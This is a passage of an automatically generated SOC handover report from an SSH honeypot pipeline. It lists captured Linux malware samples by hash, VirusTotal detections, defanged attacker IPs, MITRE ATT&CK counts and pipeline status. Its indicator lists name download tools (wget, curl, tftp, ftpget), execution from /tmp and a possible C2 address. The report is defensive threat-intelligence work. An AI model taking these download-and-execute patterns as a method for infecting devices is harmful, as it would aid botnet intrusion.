| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 49/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.20.138[.]3` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `218.21.243[.]58` | CN | InnerMongoliaWuhaiGongWuSu109JiaYouZhan | **100** ⚠️ | 50 |
| `213.230.64[.]246` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `220.122.115[.]9` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `62.201.253[.]23` | IQ | IQ Networks for Data and Internet Services Ltd | **100** ⚠️ | 22 |
| `60.223.251[.]132` | CN | China Unicom Shanxi Province Network | **100** ⚠️ | 50 |
| `93.177.157[.]179` | GE | Magticom | **100** ⚠️ | 50 |
| `220.246.41[.]171` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `122.187.237[.]122` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `211.247.127[.]250` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 137 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 127 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 51 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 49 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 49 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 180 cases |
| Tool 34  | Credential Extractor        | ✅ 161 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 98 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (11.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 62 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 127 priority case(s) shown individually · 22 recon entry/entries in table (5 group(s) consolidating 16 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-22T21:14:13Z_
